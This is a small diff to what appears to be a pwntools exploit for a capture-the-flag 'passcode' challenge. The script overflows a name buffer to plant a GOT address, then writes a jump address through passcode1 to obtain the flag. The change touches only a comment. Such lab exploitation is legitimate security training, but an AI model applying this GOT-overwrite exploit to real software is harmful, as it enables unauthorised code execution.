@@ -7,7 +7,7 @@ io.recvuntil("enter you name : ")
 payload = b'a'*96 + p32(0x804a004)
 io.sendline(payload)
 io.recvuntil("enter passcode1 : ")
-io.sendline(b'134514147')  # str.encode(str(0x80485e3))
+io.sendline(b'134514147')  # str(0x80485e3).encode()
 flag = io.recv()
 log.success(flag)
 # Sorry mom.. I got confused about scanf usage :(
